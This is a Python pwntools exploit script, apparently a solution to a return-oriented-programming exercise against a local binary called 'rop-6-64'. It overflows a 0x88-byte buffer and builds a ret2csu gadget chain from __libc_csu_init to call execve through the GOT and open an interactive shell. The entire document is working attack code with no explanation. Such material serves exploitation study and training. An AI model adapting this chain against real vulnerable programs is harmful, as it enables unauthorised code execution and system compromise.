#!/usr/bin/env python

from pwn import *

p = process('./rop-6-64')

buf = "A" * 0x88

execve = p.elf.got['execve']

"""
0x00000000004006e0 <+64>:    mov    %r13,%rdx
0x00000000004006e3 <+67>:    mov    %r14,%rsi
0x00000000004006e6 <+70>:    mov    %r15d,%edi
0x00000000004006e9 <+73>:    callq  *(%r12,%rbx,8)
0x00000000004006ed <+77>:    add    $0x1,%rbx
0x00000000004006f1 <+81>:    cmp    %rbp,%rbx
0x00000000004006f4 <+84>:    jne    0x4006e0 <__libc_csu_init+64>
0x00000000004006f6 <+86>:    add    $0x8,%rsp
0x00000000004006fa <+90>:    pop    %rbx
0x00000000004006fb <+91>:    pop    %rbp
0x00000000004006fc <+92>:    pop    %r12
0x00000000004006fe <+94>:    pop    %r13
0x0000000000400700 <+96>:    pop    %r14
0x0000000000400702 <+98>:    pop    %r15
0x0000000000400704 <+100>:   retq

0x0000000000400703 : pop rdi ; ret
"""
pop_rdi = p64(0x400703)
pop_rbx_rbp_r12_r13_r14_r15 = p64(0x00000000004006fa)
mov_r13_r14_r15d_call = p64(0x00000000004006e0)

#0x400178:       "D"

binsh = p64(0x400178)

buf += pop_rdi
buf += p64(0)
buf += pop_rbx_rbp_r12_r13_r14_r15
buf += p64(0)       # rbx
buf += p64(0)       # rbp
buf += p64(execve)  # r12
buf += p64(0)       # r13 -> rdx
buf += p64(0)       # r14 -> rsi
buf += binsh        # r15d -> edi -> rdi
buf += mov_r13_r14_r15d_call

p.sendline(buf)
p.interactive()
